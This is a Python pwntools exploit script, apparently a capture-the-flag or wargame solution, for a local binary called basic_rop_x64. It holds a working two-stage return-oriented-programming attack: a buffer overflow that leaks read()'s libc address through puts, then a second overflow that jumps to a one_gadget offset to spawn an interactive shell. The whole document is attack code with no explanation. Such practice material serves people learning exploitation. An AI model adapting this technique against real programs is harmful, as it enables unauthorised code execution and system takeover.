from pwn import *
def slog(n, m): return success(": ".join([n, hex(m)]))

context.log_level = 'debug'

p = process("./basic_rop_x64")
e = ELF("./basic_rop_x64")
libc = ELF("/lib/x86_64-linux-gnu/libc-2.31.so")

context.log_level = 'debug'
gdb.attach(p)

buf2sfp = 0x40+0x8
pop_rdi = 0x0000000000400883
pop_r12_r13_r14_r15 = 0x000000000040087c
ret2main = e.symbols["main"]

read_got = e.got["read"]
puts_plt = e.plt["puts"]
read_plt = e.plt["read"]

slog("read_got", read_got)
slog("puts_plt", puts_plt)

payload = b"A"*buf2sfp
# for get read() address - exploit : puts() call
payload += p64(pop_rdi) + p64(read_got)
payload += p64(puts_plt) # puts(read_got) read() address print not call read()
payload += p64(ret2main)

p.send(payload)
p.recvn(0x40)
read_addr = u64(p.recvn(6)+b"\x00"*2)
slog("read()", read_addr)

libc_base = read_addr - libc.symbols["read"]
slog("read offset", libc.symbols["read"])
slog("lb", libc_base)

og_addr = libc_base + 0xe6c7e
slog("og", og_addr)

payload = b"A"*buf2sfp
payload += p64(pop_r12_r13_r14_r15)
payload += p64(0)
payload += p64(0)
payload += p64(0)
payload += p64(0)
payload += p64(og_addr)

p.send(payload)

p.interactive()